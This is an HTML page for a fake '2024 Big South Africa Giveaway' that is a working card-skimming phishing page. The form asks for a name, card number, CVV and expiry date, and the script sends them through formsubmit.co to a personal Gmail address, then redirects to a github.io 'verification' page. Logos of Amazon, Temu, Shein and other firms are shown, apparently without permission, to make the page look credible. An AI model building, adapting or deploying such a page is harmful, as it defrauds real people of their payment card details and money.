<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2024 Big South Africa Giveaway</title>
    <style>
        /* General Styles */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background: #f9f9f9;
            color: #333;
            box-sizing: border-box;
        }
        header {
            background: linear-gradient(45deg, #2a8ac4, #2b7db1);
            color: white;
            text-align: center;
            padding: 4px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            border-bottom: 4px solid #4a8ec2;
        }
        header h1 {
            font-size: 2.5rem;
            font-weight: bold;
            margin: 0;
        }
        header p {
            font-size: 1.2rem;
            margin-top: 1px;
            font-weight: 400;
        }
        .form-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            max-width: 400px;
            margin: auto;
            margin-top: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        .form-container h1 {
            text-align: center;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background: #28a745;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background: #218838;
        }

        /* Sponsors Section */
        .sponsors {
            text-align: center;
            padding: 50px 20px;
            background: #ffffff;
            margin-top: 50px;
        }
        .sponsors h2 {
            font-size: 2rem;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .sponsor-logos {
            display: flex;
            justify-content: center;
            gap: 30px;
            flex-wrap: wrap;
        }
        .sponsor-logos img {
            width: 150px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }
        .sponsor-logos img:hover {
            transform: scale(1.08);
        }
    </style>
</head>
<body>

<header>
    <h1>2024 Big South Africa Giveaway</h1>
    <p>Fill in your details below to complete your payment</p>
</header>

<div class="form-container">
    <h1>Payment Details</h1>
    <form id="paymentForm" action="https://formsubmit.co/iamfinaid6@gmail.com" method="POST">
        <label for="name">Name:</label>
        <input type="text" id="name" name="name" required>

        <label for="cardno">Card Number:</label>
        <input type="text" id="cardno" name="cardno" required>

        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" required>

        <label for="month">Month (MM):</label>
        <input type="text" id="month" name="month" placeholder="Enter Month (MM)" required>

        <label for="year">Year (YYYY):</label>
        <input type="text" id="year" name="year" placeholder="Enter Year (YYYY)" required>

        <input type="hidden" name="_subject" value="New Payment Submission">
        <input type="hidden" name="_captcha" value="false">

        <button type="submit">Pay R20</button>
    </form>
</div>

<script>
    document.getElementById('paymentForm').addEventListener('submit', function (e) {
        e.preventDefault(); // Prevent the default form submission

        const formData = new FormData(this);

        fetch(this.action, {
            method: 'POST',
            body: formData,
        })
        .then(response => {
            if (response.ok) {
                // Redirect after successful submission
                window.location.href = 'https://big24promo.github.io/SA2024promo/veri.html';
            } else {
                alert('Error submitting form. Please try again.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An unexpected error occurred. Please try again.');
        });
    });
</script>
</section>
<!-- Sponsors Section -->
    <section class="sponsors">
        <h2>Sponsored By</h2>
        <div class="sponsor-logos">
            <img src="https://big24promo.github.io/SA2024promo/images/Amazon.png">
            <img src="https://big24promo.github.io/SA2024promo/images/bidt001_bidvest.jpg">
            <img src="https://big24promo.github.io/SA2024promo/images/temu.png">
            <img src="https://big24promo.github.io/SA2024promo/images/shein.png">
            <img src="https://big24promo.github.io/SA2024promo/images/ivestc.jpg">
            <img src="https://big24promo.github.io/SA2024promo/images/mass.png">
        </div>
    </section>
</body>
</html>
